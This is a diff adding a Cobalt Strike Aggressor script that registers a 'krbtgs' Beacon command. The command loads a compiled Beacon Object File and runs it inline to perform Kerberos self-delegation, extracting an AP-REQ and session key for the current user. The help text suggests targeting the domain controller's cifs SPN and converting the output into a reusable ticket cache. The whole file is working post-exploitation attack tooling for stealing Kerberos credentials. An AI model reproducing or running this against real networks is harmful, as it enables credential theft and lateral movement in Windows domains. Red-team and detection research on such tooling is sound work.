@@ -1,0 +1,66 @@
+#
+# Credit to @offsec_ginger
+#
+sub random_string {
+	$limit = $1;
+	@random_str = @();
+	$characters = "abcdefghijklmnopqrstuvwxyz";
+	for ( $x = 0 ; $x < $limit ; $x++ ) {
+		$n = rand( strlen( $characters ) );
+		add( @random_str, charAt( $characters, $n ) );
+	}
+	return join( '', @random_str );
+}
+
+#
+# Requests a TGS for the current user without
+# a password with self-delegation
+#
+alias krbtgs {
+	local('$barch $handle $object $bargs');
+
+	#
+	# Opens the COFF object file using aggresor
+	# within the same directory as the current
+	# script.
+	#
+	$barch  = barch( $1 );
+	$handle = openf( script_resource( "KrbTgsBof. $+ $barch $+ .o" ) );
+	$object = readb( $handle, -1 );
+	closef( $handle );
+
+	#
+	# Do we have an SPN argument ?
+	#
+	if ( size( @_ ) != 2 ) {
+		berror( $1, "krbtgs error: not enough arguments" );
+		return;
+	}
+
+	$rnd = random_string( "12" );
+	$apr = $rnd . "_apreq";
+	$key = $rnd . "_key";
+
+	#
+	# Create argument buffer
+	#
+	$bargs = bof_pack( $1, "Zzz", $2, $apr, $key );
+
+	#
+	# Deploy the COFF file with relocations applied
+	# to resolve the jumps.
+	#
+	btask( $1, "Tasked Beacon to perform self-delegation to acquire a Kerberos Ticket-Granting-Ticket ( TGT )" );
+	btask( $1, "APREQ will be stored in ". $apr );
+	btask( $1, "Session Key will be stored in ". $key );
+	beacon_inline_execute( $1, $object, "KrbTgsGo", $bargs );
+};
+
+beacon_command_register( "krbtgs", "Download a kerberos apreq and session key for the curent user.",
+			 "Use: krbtgs [spn]\n".
+			 "\n".
+			 "Performs Kerberos self-delegation to the specified SPN to retrieve a Kerberos apreq\n".
+			 "and session key. The resulting files can be converted into an ccache with the help\n".
+			 "of the extract_tickets.py script in the scripts directory.\n".
+			 "\n".
+			 "If are unsure of what SPN to use, specifiy cifs/ with the computer name of the DC" );
